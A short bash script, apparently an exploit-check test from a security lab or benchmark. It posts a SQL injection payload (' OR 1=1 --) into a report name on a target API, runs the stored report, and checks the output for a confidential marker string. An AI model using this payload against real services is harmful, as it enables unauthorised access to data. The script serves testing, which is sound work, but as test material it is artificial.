#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
resp=$(curl -fsS -X POST "$TARGET/api/reports" -H "$json_ct" --data-binary '{"name":"%'"'"' OR 1=1 --"}')
id=$(python3 -c 'import sys,json; print(json.load(sys.stdin)["id"])' <<<"$resp")
curl -fsS "$TARGET/api/reports/run/$id" | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'
